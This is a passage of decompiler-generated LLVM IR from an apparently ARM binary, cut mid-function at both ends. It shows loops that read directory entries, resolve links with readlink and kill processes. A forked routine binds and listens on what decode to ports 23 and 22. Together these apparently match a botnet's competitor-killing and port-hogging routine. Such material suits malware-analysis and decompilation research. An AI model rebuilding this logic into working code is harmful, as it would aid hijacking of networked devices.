  %v2_f5e4 = inttoptr i32 %v0_f5d8 to i32*
  %v3_f5e4 = call i32 @function_13044(i32 7, i32* %v2_f5e4)
  %v0_f5ec = load i32, i32* @sl, align 4
  %v2_f5ec = add i32 %v2_f5d4, %v0_f5ec
  store i32 %v2_f5ec, i32* @r0, align 4
  %v2_f5f0 = inttoptr i32 %v2_f5ec to i8*
  %v3_f5f0 = call i32 @function_13a7c(i8* %v2_f5f0, i32 %v3_f5e4)
  %v3_f600 = call i32 @_readlink(i32 %v2_f2d0, i32 %v2_f2e4, i32 4096)
  %v7_f604 = icmp eq i32 %v3_f600, -1
  br i1 %v7_f604, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f5a4
  %v0_f60c = load i32, i32* @r5, align 4
  %v2_f614 = inttoptr i32 %v0_f60c to i32*
  %v3_f614 = call i32 @function_13044(i32 6, i32* %v2_f614)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f620 = call i32 @function_13a7c(i8* %v2_f5b8, i32 %v3_f614)
  %v2_f628 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f62c = load i32, i32* @r7, align 4
  %v0_f630 = load i32, i32* @sl, align 4
  %v2_f630 = add i32 %v0_f630, %v2_f628
  store i32 %v2_f630, i32* @r0, align 4
  %v2_f634 = inttoptr i32 %v2_f630 to i8*
  %v3_f634 = call i32 @function_13a7c(i8* %v2_f634, i32 %v0_f62c)
  %v2_f63c = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f640 = load i32, i32* @r5, align 4
  store i32 %v2_f63c, i32* %r4.global-to-local, align 4
  %v2_f64c = inttoptr i32 %v0_f640 to i32*
  %v3_f64c = call i32 @function_13044(i32 9, i32* %v2_f64c)
  %v0_f654 = load i32, i32* @sl, align 4
  %v2_f654 = add i32 %v2_f63c, %v0_f654
  store i32 %v2_f654, i32* @r0, align 4
  %v2_f658 = inttoptr i32 %v2_f654 to i8*
  %v3_f658 = call i32 @function_13a7c(i8* %v2_f658, i32 %v3_f64c)
  %v3_f660 = call %__dirstream* @opendir(i8* %v2_f5b8)
  %v5_f660 = ptrtoint %__dirstream* %v3_f660 to i32
  store i32 %v5_f660, i32* %sb.global-to-local, align 4
  %v2_f664 = icmp eq %__dirstream* %v3_f660, null
  br i1 %v2_f664, label %dec_label_pc_f578.loopexit, label %dec_label_pc_f66c.preheader

dec_label_pc_f66c.preheader:                      ; preds = %dec_label_pc_f60c
  %v1_f67040 = call i32 @_readdir(i32 %v5_f660)
  store i32 %v1_f67040, i32* @r6, align 4
  %v2_f67442 = icmp eq i32 %v1_f67040, 0
  br i1 %v2_f67442, label %dec_label_pc_f774, label %dec_label_pc_f684thread-pre-split

dec_label_pc_f66c.loopexit:                       ; preds = %dec_label_pc_f68c, %dec_label_pc_f724
  %v0_f66c = load i32, i32* %sb.global-to-local, align 4
  %v1_f670 = call i32 @_readdir(i32 %v0_f66c)
  store i32 %v1_f670, i32* @r6, align 4
  %v2_f674 = icmp eq i32 %v1_f670, 0
  br i1 %v2_f674, label %dec_label_pc_f774, label %dec_label_pc_f684thread-pre-split

dec_label_pc_f684thread-pre-split:                ; preds = %dec_label_pc_f66c.preheader, %dec_label_pc_f66c.loopexit
  %v0_f684.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f684thread-pre-split, %dec_label_pc_f74c
  %v0_f684 = phi i32 [ %v0_f684.pr, %dec_label_pc_f684thread-pre-split ], [ 1, %dec_label_pc_f74c ]
  %v2_f684 = icmp eq i32 %v0_f684, 0
  br i1 %v2_f684, label %dec_label_pc_f68c, label %dec_label_pc_f774

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f684
  %v2_f68c = call i32 @function_13af4(i32 %v2_f2e4, i32 4096)
  %v0_f690 = load i32, i32* @r5, align 4
  %v2_f698 = inttoptr i32 %v0_f690 to i32*
  %v3_f698 = call i32 @function_13044(i32 6, i32* %v2_f698)
  store i32 %v2_f2d0, i32* @r0, align 4
  %v3_f6a4 = call i32 @function_13a7c(i8* %v2_f5b8, i32 %v3_f698)
  %v2_f6ac = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f6b0 = load i32, i32* @r7, align 4
  %v0_f6b4 = load i32, i32* @sl, align 4
  %v2_f6b4 = add i32 %v0_f6b4, %v2_f6ac
  store i32 %v2_f6b4, i32* @r0, align 4
  %v2_f6b8 = inttoptr i32 %v2_f6b4 to i8*
  %v3_f6b8 = call i32 @function_13a7c(i8* %v2_f6b8, i32 %v0_f6b0)
  %v2_f6c0 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f6c4 = load i32, i32* @r5, align 4
  store i32 %v2_f6c0, i32* @r4, align 4
  %v2_f6d0 = inttoptr i32 %v0_f6c4 to i32*
  %v3_f6d0 = call i32 @function_13044(i32 9, i32* %v2_f6d0)
  %v0_f6d8 = load i32, i32* @sl, align 4
  %v1_f6d8 = load i32, i32* @r4, align 4
  %v2_f6d8 = add i32 %v1_f6d8, %v0_f6d8
  store i32 %v2_f6d8, i32* @r0, align 4
  %v2_f6dc = inttoptr i32 %v2_f6d8 to i8*
  %v3_f6dc = call i32 @function_13a7c(i8* %v2_f6dc, i32 %v3_f6d0)
  %v2_f6e4 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f6ec = load i32, i32* @sl, align 4
  %v2_f6ec = add i32 %v0_f6ec, %v2_f6e4
  store i32 %v2_f6ec, i32* @r0, align 4
  %v2_f6f0 = inttoptr i32 %v2_f6ec to i8*
  %v3_f6f0 = call i32 @function_13a7c(i8* %v2_f6f0, i32 ptrtoint (i32* @global_var_143b8.78 to i32))
  %v2_f6f8 = call i32 @function_13a54(i8* %v2_f5b8)
  %v0_f6fc = load i32, i32* @r6, align 4
  %v1_f6fc = add i32 %v0_f6fc, 11
  %v0_f700 = load i32, i32* @sl, align 4
  %v2_f700 = add i32 %v0_f700, %v2_f6f8
  store i32 %v2_f700, i32* @r0, align 4
  %v2_f704 = inttoptr i32 %v2_f700 to i8*
  %v3_f704 = call i32 @function_13a7c(i8* %v2_f704, i32 %v1_f6fc)
  %v3_f714 = call i32 @_readlink(i32 %v2_f2d0, i32 %v2_f2e4, i32 4096)
  %v7_f718 = icmp eq i32 %v3_f714, -1
  br i1 %v7_f718, label %dec_label_pc_f66c.loopexit, label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f68c
  %v2_f724 = call i32 @function_13a54(i8* %v1_f724)
  store i32 %v2_f724, i32* @r1, align 4
  %v4_f738 = call i32 @function_13da8(i8* %v1_f724, i32 %v2_f724, i32 %v2_f548.pre-phi)
  %v7_f73c = icmp eq i32 %v4_f738, -1
  br i1 %v7_f73c, label %dec_label_pc_f66c.loopexit, label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f724
  %v0_f744 = load i32, i32* @r7, align 4
  %v2_f74c = inttoptr i32 %v0_f744 to i8*
  %v3_f74c = call i32 @function_13b80(i8* %v2_f74c, i32 10)
  %v0_f754 = call i32 @_kill()
  %v0_f758 = load i32, i32* %sb.global-to-local, align 4
  %v1_f75c = call i32 @_readdir(i32 %v0_f758)
  store i32 %v1_f75c, i32* @r6, align 4
  %v2_f760 = icmp eq i32 %v1_f75c, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_f760, label %dec_label_pc_f774, label %dec_label_pc_f684

dec_label_pc_f774:                                ; preds = %dec_label_pc_f66c.loopexit, %dec_label_pc_f74c, %dec_label_pc_f684, %dec_label_pc_f66c.preheader
  %v0_f774 = load i32, i32* %sb.global-to-local, align 4
  %v1_f774 = inttoptr i32 %v0_f774 to %__dirstream*
  %v3_f778 = call i32 @closedir(%__dirstream* %v1_f774)
  %v0_f77c = load i32, i32* @r8, align 4
  %v1_f780 = call i32 @_readdir(i32 %v0_f77c)
  %v2_f784 = icmp eq i32 %v1_f780, 0
  br i1 %v2_f784, label %dec_label_pc_f78c, label %dec_label_pc_f588

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f578.loopexit, %dec_label_pc_f774, %dec_label_pc_f588, %dec_label_pc_f578.preheader
  %v0_f78c = load i32, i32* @r8, align 4
  %v1_f78c = inttoptr i32 %v0_f78c to %__dirstream*
  %v3_f790 = call i32 @closedir(%__dirstream* %v1_f78c)
  %v0_f794 = load i32, i32* @r5, align 4
  %v1_f794 = urem i32 %v0_f794, 256
  br label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f558, %dec_label_pc_f78c
  %storemerge = phi i32 [ %v1_f794, %dec_label_pc_f78c ], [ %v5_f564, %dec_label_pc_f558 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_f79c = call i32 @_sleep(i32 1)
  br label %dec_label_pc_f7a0

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f53c, %dec_label_pc_f798
  %v1_f7a4 = call i32 @function_13070(i32 6)
  %v1_f7ac = call i32 @function_13070(i32 7)
  %v1_f7b4 = call i32 @function_13070(i32 9)
  br label %dec_label_pc_f7b8

dec_label_pc_f7b8:                                ; preds = %dec_label_pc_f36c, %dec_label_pc_f7a0
  %v0_f7b8 = load i32, i32* @r4, align 4
  %v2_f7c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f7c4, i32* @r4, align 4
  store i32 %v6_f2bc, i32* @r5, align 4
  store i32 %v9_f2bc, i32* @r6, align 4
  store i32 %v12_f2bc, i32* @r7, align 4
  store i32 %v15_f2bc, i32* @r8, align 4
  store i32 %v21_f2bc, i32* @sl, align 4
  ret i32 %v0_f7b8

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f4ac
  %v1_f7c8 = add i32 %v0_f7c8, 1
  %v7_f7cc = icmp eq i32 %v0_f7c8, 0
  br i1 %v7_f7cc, label %dec_label_pc_f7d4, label %dec_label_pc_f4b4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7c8
  %v1_f7d4 = add i32 %v0_f4bc, 3
  %v2_f7d4 = inttoptr i32 %v1_f7d4 to i8*
  %v3_f7d4 = load i8, i8* %v2_f7d4, align 1
  %v7_f7d8 = icmp eq i8 %v3_f7d4, 65
  br i1 %v7_f7d8, label %dec_label_pc_f7e8, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_f7d4
  br label %dec_label_pc_f484.backedge

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f7d4
  store i32 %v1_f7c8, i32* @r4, align 4
  br label %dec_label_pc_f484.backedge

dec_label_pc_f484.backedge:                       ; preds = %.thread33, %dec_label_pc_f7e8, %dec_label_pc_f4b8
  %v0_f4c483 = phi i32 [ %v1_f7c8, %dec_label_pc_f7e8 ], [ %v0_f4c484, %dec_label_pc_f4b8 ], [ %v0_f4c484, %.thread33 ]
  %v0_f7c872 = phi i32 [ %v1_f7c8, %dec_label_pc_f7e8 ], [ %v0_f4b8, %dec_label_pc_f4b8 ], [ %v1_f7c8, %.thread33 ]
  %v0_f4ac.pr69 = phi i32 [ 0, %dec_label_pc_f7e8 ], [ %v0_f4ac.pr70, %dec_label_pc_f4b8 ], [ 0, %.thread33 ]
  %v0_f484 = add i32 %v0_f4bc, 1
  %v1_f484 = add i32 %v0_f4bc, 3
  %v2_f484 = inttoptr i32 %v1_f484 to i8*
  %v3_f484 = load i8, i8* %v2_f484, align 1
  %v2_f488 = icmp eq i8 %v3_f484, 0
  %v1_f48c = add i32 %v0_f48c80, 1
  br i1 %v2_f488, label %dec_label_pc_f4c4, label %dec_label_pc_f494

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f2bc
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_f36c

; uselistorder directives
  uselistorder i32 %v1_f48c, { 1, 0 }
  uselistorder i8 %v3_f484, { 1, 0 }
  uselistorder i32 %v0_f4c483, { 1, 0 }
  uselistorder i32 %v1_f7c8, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v1_f780, { 1, 0 }
  uselistorder i32 %v1_f4f0, { 1, 0 }
  uselistorder i32 %v0_f4fc28, { 1, 0 }
  uselistorder i32 %v1_f514, { 0, 3, 1, 2 }
  uselistorder i32 %v0_f4b8, { 1, 0 }
  uselistorder i32 %v0_f48c80, { 1, 0 }
  uselistorder i32 %v0_f7c8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_f4c484, { 1, 2, 0 }
  uselistorder i32 %v1_f48c54, { 1, 0 }
  uselistorder i32 %v2_f470, { 1, 0 }
  uselistorder i32 %v1_f46c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_f42813, { 1, 0, 2 }
  uselistorder i32 %v0_f418, { 1, 0 }
  uselistorder i32 %v1_f3f8, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_f38c, { 1, 2, 0 }
  uselistorder i32* %v3_f32c, { 1, 0, 2 }
  uselistorder i32 %v2_f2e4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_13b80, { 1, 0, 2, 3, 4 }
  uselistorder i32 47, { 4, 5, 0, 6, 1, 7, 2, 8, 9, 3 }
  uselistorder i32 (i32*, i32, i32)* @function_13cac, { 1, 0 }
  uselistorder i32 512, { 4, 0, 1, 7, 5, 6, 8, 2, 9, 3, 10 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_f484.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7b8, { 1, 0 }
  uselistorder label %dec_label_pc_f7a0, { 1, 0 }
  uselistorder label %dec_label_pc_f798, { 1, 0 }
  uselistorder label %dec_label_pc_f78c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f774, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f684, { 1, 0 }
  uselistorder label %dec_label_pc_f684thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_f66c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f588, { 1, 0 }
  uselistorder label %dec_label_pc_f588.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f578.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f4b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
  uselistorder label %dec_label_pc_f438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f39c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_f3ec, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f3b4, { 1, 0 }
  uselistorder label %dec_label_pc_f36c, { 1, 0 }
}

define i32 @function_f828(i32 %arg1) local_unnamed_addr {
dec_label_pc_f828:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f828 = load i32, i32* @r4, align 4
  store i32 %v3_f828, i32* %stack_var_-36, align 4
  %v6_f828 = load i32, i32* @r5, align 4
  %v9_f828 = load i32, i32* @r6, align 4
  %v12_f828 = load i32, i32* @r7, align 4
  %v15_f828 = load i32, i32* @r8, align 4
  %v2_f838 = call i32 @time(i32* null)
  store i32 %v2_f838, i32* @r7, align 4
  %v0_f840 = call i32 @fork()
  %v7_f844 = icmp eq i32 %v0_f840, -1
  %. = zext i1 %v7_f844 to i32
  %tmp211 = icmp slt i32 %v0_f840, 1
  %storemerge173 = select i1 %tmp211, i32 %., i32 1
  store i32 %storemerge173, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cdfc.152 to i32), i32* %r3.global-to-local, align 4
  %v2_f860 = icmp eq i32 %storemerge173, 0
  store i32 %v0_f840, i32* @global_var_1cdfc.152, align 4
  br i1 %v2_f860, label %dec_label_pc_f878, label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_fa44, %dec_label_pc_f92c, %dec_label_pc_f828
  %v29_f874 = phi i32 [ %v4_f9d0, %dec_label_pc_f92c ], [ %v0_f840, %dec_label_pc_f828 ], [ %v5_fa58, %dec_label_pc_fa44 ]
  %v2_f874 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f874, i32* @r4, align 4
  store i32 %v6_f828, i32* @r5, align 4
  store i32 %v9_f828, i32* @r6, align 4
  store i32 %v12_f828, i32* @r7, align 4
  store i32 %v15_f828, i32* @r8, align 4
  ret i32 %v29_f874

dec_label_pc_f878:                                ; preds = %dec_label_pc_f828
  %v2_f878 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_f878, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_f890 = call i32 @function_f2bc(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_f89c = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_f8a4 = load i32, i32* @r5, align 4
  store i32 %v0_f8a4, i32* %r2.global-to-local, align 4
  %v3_f8b0 = call i32 @_socket(i32 %v0_f89c, i32 1, i32 %v0_f8a4)
  %v7_f8b4 = icmp eq i32 %v3_f8b0, -1
  store i32 %v3_f8b0, i32* @r4, align 4
  br i1 %v7_f8b4, label %dec_label_pc_f8dc, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %dec_label_pc_f878
  %v2_f8c4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f8c4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_f8cc = call i32 @_bind()
  %v0_f8d0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_f8d8 = call i32 @listen(i32 %v0_f8d0, i32 1)
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f8c0
  %v1_f8e0 = call i32 @function_f2bc(i32 5632)
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_f8ec = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_f8f4 = load i32, i32* @r5, align 4
  store i32 %v0_f8f4, i32* %r2.global-to-local, align 4
  %v3_f900 = call i32 @_socket(i32 %v0_f8ec, i32 1, i32 %v0_f8f4)
  %v7_f904 = icmp eq i32 %v3_f900, -1
  store i32 %v3_f900, i32* @r4, align 4
  br i1 %v7_f904, label %dec_label_pc_f92c, label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %dec_label_pc_f8dc
  %v2_f914 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f914, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_f91c = call i32 @_bind()
  %v0_f920 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_f928 = call i32 @listen(i32 %v0_f920, i32 1)
  br label %dec_label_pc_f92c

dec_label_pc_f92c:                                ; preds = %dec_label_pc_f8dc, %dec_label_pc_f910
  %v1_f930 = call i32 @_sleep(i32 5)
  %v1_f938 = call i32 @_malloc(i32 4096)
  store i32 ptrtoint (i32* @global_var_1cda4.158 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdf8.160 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_f938, i32* %r2.global-to-local, align 4
  %v0_f948 = load i32, i32* @r5, align 4
  %v1_f948 = trunc i32 %v0_f948 to i8
  %v3_f948 = inttoptr i32 %v1_f938 to i8*
  store i8 %v1_f948, i8* %v3_f948, align 1
  %v0_f950 = load i32, i32* @r5, align 4
  %v1_f950 = load i32, i32* %r3.global-to-local, align 4
  %v2_f950 = inttoptr i32 %v1_f950 to i32*
  store i32 %v0_f950, i32* %v2_f950, align 4
  %v0_f954 = load i32, i32* %r2.global-to-local, align 4
  %v1_f954 = load i32, i32* %r1.global-to-local, align 4
  %v2_f954 = inttoptr i32 %v1_f954 to i32*
  store i32 %v0_f954, i32* %v2_f954, align 4
  %v1_f958 = call i32 @function_13128(i32 6)
  %v1_f960 = call i32 @function_13128(i32 7)
  %v0_f964 = load i32, i32* @r5, align 4
  store i32 %v0_f964, i32* %r1.global-to-local, align 4
  %v2_f96c = inttoptr i32 %v0_f964 to i32*
  %v3_f96c = call i32 @function_13044(i32 6, i32* %v2_f96c)
  %v2_f974 = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_f974, i32* @r8, align 4
  store i32 %v3_f96c, i32* %r1.global-to-local, align 4
  store i32 %v2_f974, i32* @r0, align 4
  %v2_f980 = bitcast i32* %stack_var_-8408 to i8*
  %v3_f980 = call i32 @function_13a7c(i8* %v2_f980, i32 %v3_f96c)
  %v0_f984 = load i32, i32* @r8, align 4
  %v2_f984 = add i32 %v0_f984, %v3_f980
  store i32 %v2_f984, i32* @r4, align 4
  %v1_f988 = call i32 @_getpid(i32 %v3_f980)
  %v2_f990 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_f990, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_f998 = trunc i32 %v1_f988 to i8
  %v4_f998 = call i32 @function_13f48(i8 %v3_f998, i32 10, i32 %v2_f990)
  store i32 %v4_f998, i32* %r1.global-to-local, align 4
  %v0_f9a0 = load i32, i32* @r4, align 4
  store i32 %v0_f9a0, i32* @r0, align 4
  %v2_f9a4 = inttoptr i32 %v0_f9a0 to i8*
  %v3_f9a4 = call i32 @function_13a7c(i8* %v2_f9a4, i32 %v4_f998)
  %v0_f9a8 = load i32, i32* @r5, align 4
  store i32 %v0_f9a8, i32* %r1.global-to-local, align 4
  %v0_f9ac = load i32, i32* @r4, align 4
  %v2_f9ac = add i32 %v0_f9ac, %v3_f9a4
  store i32 %v2_f9ac, i32* @r4, align 4
  %v2_f9b4 = inttoptr i32 %v0_f9a8 to i32*
  %v3_f9b4 = call i32 @function_13044(i32 7, i32* %v2_f9b4)
  store i32 %v3_f9b4, i32* %r1.global-to-local, align 4
  %v0_f9bc = load i32, i32* @r4, align 4
  store i32 %v0_f9bc, i32* @r0, align 4
  %v2_f9c0 = inttoptr i32 %v0_f9bc to i8*
  %v3_f9c0 = call i32 @function_13a7c(i8* %v2_f9c0, i32 %v3_f9b4)
  %v0_f9c4 = load i32, i32* @r5, align 4
  store i32 %v0_f9c4, i32* %r1.global-to-local, align 4
  store i32 %v3_f9c0, i32* @r6, align 4
  %v4_f9d0 = call i32 (i8*, i32, ...) @open(i8* %v2_f980, i32 %v0_f9c4)
  %v7_f9d4 = icmp eq i32 %v4_f9d0, -1
  br i1 %v7_f9d4, label %dec_label_pc_f86c, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f92c
  %v1_f9dc = call i32 @close(i32 %v4_f9d0)
  %v1_f9e4 = call i32 @function_13070(i32 6)
  %v1_f9ec = call i32 @function_13070(i32 7)
  store i32 ptrtoint (i32* @global_var_1cdf8.160 to i32), i32* %r3.global-to-local, align 4
  %v2_f9f8 = load i32, i32* @global_var_1cdf8.160, align 4
  store i32 %v2_f9f8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_fa04 = call i32 @_readlink(i32 %v2_f974, i32 %v2_f9f8, i32 4095)
  %v7_fa08 = icmp eq i32 %v3_fa04, -1
  br i1 %v7_fa08, label %.thread5.thread, label %bb214

.thread5.thread:                                  ; preds = %dec_label_pc_f9dc
  %v0_fa1454 = load i32, i32* @r4, align 4
  %v1_fa1455 = load i32, i32* @r6, align 4
  %v2_fa1456 = add i32 %v1_fa1455, %v0_fa1454
  store i32 %v2_fa1456, i32* %r1.global-to-local, align 4
  br label %bb215

bb214:                                            ; preds = %dec_label_pc_f9dc
  %v3_fa10 = load i32, i32* @global_var_1cdf8.160, align 4
  store i32 %v3_fa10, i32* %r3.global-to-local, align 4
  %v0_fa14 = load i32, i32* @r4, align 4
  %v1_fa14 = load i32, i32* @r6, align 4
  %v2_fa14 = add i32 %v1_fa14, %v0_fa14
  store i32 %v2_fa14, i32* %r1.global-to-local, align 4
  %v1_fa18 = load i32, i32* @r5, align 4
  %v2_fa18 = trunc i32 %v1_fa18 to i8
  %v5_fa18 = add i32 %v3_fa10, %v3_fa04
  %v6_fa18 = inttoptr i32 %v5_fa18 to i8*
  store i8 %v2_fa18, i8* %v6_fa18, align 1
  %v1_fa1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb215

bb215:                                            ; preds = %.thread5.thread, %bb214
  %v1_fa1c = phi i32 [ %v2_fa1456, %.thread5.thread ], [ %v1_fa1c.pre, %bb214 ]
  %v0_fa1c = load i32, i32* @r8, align 4
  %v2_fa1c = sub i32 %v1_fa1c, %v0_fa1c
  store i32 %v2_fa1c, i32* %r1.global-to-local, align 4
  %v2_fa24 = call i32 @function_13af4(i32 %v2_f974, i32 %v2_fa1c)
  %v2_fa30 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_fa30, i32* %r1.global-to-local, align 4
  store i32 %v2_fa30, i32* %stack_var_-8428, align 4
  %v0_fa38 = load i32, i32* @r5, align 4
  %v0_fa3c = load i32, i32* @r7, align 4
  store i32 %v0_fa3c, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_fb38 = ptrtoint i32* %stack_var_-152 to i32
  %v2_fb3c = bitcast i32* %stack_var_-152 to i8*
  %v2_fb88 = ptrtoint i32* %stack_var_-216 to i32
  %v2_fb8c = bitcast i32* %stack_var_-216 to i8*
  %v2_fcfc = ptrtoint i32* %stack_var_-44 to i32
  %v2_fd0c = ptrtoint i32* %stack_var_-48 to i32
  %v2_fd20 = ptrtoint i32* %stack_var_-52 to i32
  %v2_fd34 = ptrtoint i32* %stack_var_-40 to i32
  %v2_fd4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_fc04 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fafc, %bb215
  %stack_var_-8420.0 = phi i32 [ %v0_fa38, %bb215 ], [ %stack_var_-8420.3, %dec_label_pc_fafc ]
  %v1_fa48 = call i32 @function_13128(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fa54 = call i32 @function_13044(i32 6, i32* null)
  %v4_fa54 = inttoptr i32 %v3_fa54 to i8*
  %v3_fa58 = call %__dirstream* @opendir(i8* %v4_fa54)
  %v5_fa58 = ptrtoint %__dirstream* %v3_fa58 to i32
  store i32 %v5_fa58, i32* %sl.global-to-local, align 4
  %v2_fa5c = icmp eq %__dirstream* %v3_fa58, null
  br i1 %v2_fa5c, label %dec_label_pc_f86c, label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa44
  %v1_fa68 = call i32 @function_13070(i32 6)
  %v0_fa6c117 = load i32, i32* %sl.global-to-local, align 4
  %v1_fa70118 = call i32 @_readdir(i32 %v0_fa6c117)
  %v2_fa74120 = icmp eq i32 %v1_fa70118, 0
  br i1 %v2_fa74120, label %dec_label_pc_fafc, label %dec_label_pc_fa7c.preheader

dec_label_pc_fa7c.preheader:                      ; preds = %dec_label_pc_fa64, %dec_label_pc_fa6c.backedge
  %v0_fa7c132 = phi i32 [ %v1_fa70, %dec_label_pc_fa6c.backedge ], [ %v1_fa70118, %dec_label_pc_fa64 ]
  %stack_var_-8420.1121 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_fa6c.backedge ], [ %stack_var_-8420.0, %dec_label_pc_fa64 ]
  br label %dec_label_pc_fa7c

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_fa7c.preheader, %dec_label_pc_fae4
  %v0_fa8c = phi i32 [ %v1_faf0, %dec_label_pc_fae4 ], [ %v0_fa7c132, %dec_label_pc_fa7c.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_faa0, %dec_label_pc_fae4 ], [ %stack_var_-8420.1121, %dec_label_pc_fa7c.preheader ]
  %v1_fa7c = add i32 %v0_fa8c, 11
  %v2_fa7c = inttoptr i32 %v1_fa7c to i8*
  %v3_fa7c = load i8, i8* %v2_fa7c, align 1
  %v4_fa7c = zext i8 %v3_fa7c to i32
  %v1_fa80 = add nsw i32 %v4_fa7c, -48
  store i32 %v1_fa80, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_fa80, 9
  br i1 %tmp, label %dec_label_pc_fa6c.backedge, label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_fa7c
  store i32 %v1_fa7c, i32* @r6, align 4
  %v4_fa94 = call i32 @atoi(i8* %v2_fa7c)
